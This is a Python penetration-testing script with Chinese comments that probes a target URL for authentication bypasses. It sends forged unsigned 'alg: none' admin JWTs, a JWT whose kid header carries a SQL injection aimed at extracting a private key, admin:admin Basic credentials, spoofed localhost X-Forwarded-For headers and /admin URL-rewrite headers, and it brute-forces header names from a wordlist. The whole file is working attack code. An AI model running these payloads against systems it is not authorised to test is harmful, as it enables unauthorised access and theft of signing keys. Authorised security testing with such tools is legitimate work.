import requests
import base64
import argparse
import threading
import json

# 读取字典文件
def load_wordlist(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"[!] 文件 {file_path} 未找到，跳过该字典。")
        return []

# 手动生成伪造 JWT
def generate_fake_jwt():
    header = json.dumps({"alg": "none", "typ": "JWT"}).encode()
    payload = json.dumps({"user": "admin", "role": "admin"}).encode()

    fake_header = base64.urlsafe_b64encode(header).decode().rstrip("=")
    fake_payload = base64.urlsafe_b64encode(payload).decode().rstrip("=")

    return f"{fake_header}.{fake_payload}."

# 伪造 JWT Kid SQL 注入
def generate_jwt_kid_sql_injection():
    header = json.dumps({"alg": "HS256", "kid": "1' UNION SELECT private_key FROM keys--"}).encode()
    payload = json.dumps({"user": "admin"}).encode()

    fake_header = base64.urlsafe_b64encode(header).decode().rstrip("=")
    fake_payload = base64.urlsafe_b64encode(payload).decode().rstrip("=")

    return f"{fake_header}.{fake_payload}."

# 检测 HTTP 头未授权访问 & JWT 认证漏洞
def unauthorized_access_check(url, method):
    """
    测试 HTTP 头未授权访问 & JWT 认证漏洞：
    - 伪造 JWT Token
    - 冷门 HTTP 头认证
    """
    fake_jwt = generate_fake_jwt()
    jwt_kid_injection = generate_jwt_kid_sql_injection()

    headers_list = [
        {},  # 无认证头
        {"Authorization": "Bearer null"},
        {"Authorization": "Bearer " + fake_jwt},  # 伪造无签名 JWT
        {"Authorization": "Bearer " + jwt_kid_injection},  # JWT Key ID SQL 注入
        {"Authorization": "Basic " + base64.b64encode(b"admin:admin").decode()},
        {"X-API-Key": "null"},
        {"X-Auth-Token": "null"},
        {"Authorization-Token": "null"},
        {"Proxy-Authorization": "Basic null"},
        {"Authentication": "Bearer null"},
        {"authorization": "Bearer null"},  # 小写绕过
        {"AUTHORIZATION": "Bearer null"},  # 大写绕过
        {"X-Forwarded-For": "127.0.0.1"},  # 伪造内网 IP
        {"X-Forwarded-Host": "localhost"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
    ]

    for headers in headers_list:
        try:
            response = requests.request(method, url, headers=headers)
            print(f"[*] Testing {headers} - Status: {response.status_code}")
            if response.status_code == 200:
                print(f"[+] Vulnerability Found! Bypassed with {headers}")
                return
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")

# 使用 header.txt 中的头部进行爆破测试
def brute_force_headers(url, method, header_file):
    header_names = load_wordlist(header_file)
    if not header_names:
        print("[!] 未加载到任何头部名称，爆破测试无法进行。")
        return

    for header_name in header_names:
        headers = {header_name: "test"}
        try:
            response = requests.request(method, url, headers=headers)
            print(f"[*] Testing header '{header_name}' - Status: {response.status_code}")
            if response.status_code == 200:
                print(f"[+] Potential vulnerability detected with header '{header_name}'")
        except requests.RequestException as e:
            print(f"[!] Request error with header '{header_name}': {e}")

# 解析命令行参数
def parse_args():
    parser = argparse.ArgumentParser(description="HTTP 头未授权访问 & JWT 渗透测试")
    parser.add_argument("-u", "--url", required=True, help="目标 URL")
    parser.add_argument("-m", "--mode", choices=["unauthorized", "brute"], default="unauthorized",
                        help="模式 (unauthorized: 默认, brute: 爆破)")
    parser.add_argument("--method", choices=["GET", "POST", "PUT", "DELETE"], default="GET",
                        help="HTTP 请求方法 (默认: GET)")
    parser.add_argument("--header-file", default="header.txt", help="包含 HTTP 头部名称的文件路径 (默认: header.txt)")
    return parser.parse_args()

# 运行 Fuzz
def main():
    args = parse_args()
    url = args.url

    if args.mode == "unauthorized":
        unauthorized_access_check(url, args.method)
    elif args.mode == "brute":
        brute_force_headers(url, args.method, args.header_file)

if __name__ == "__main__":
    main()
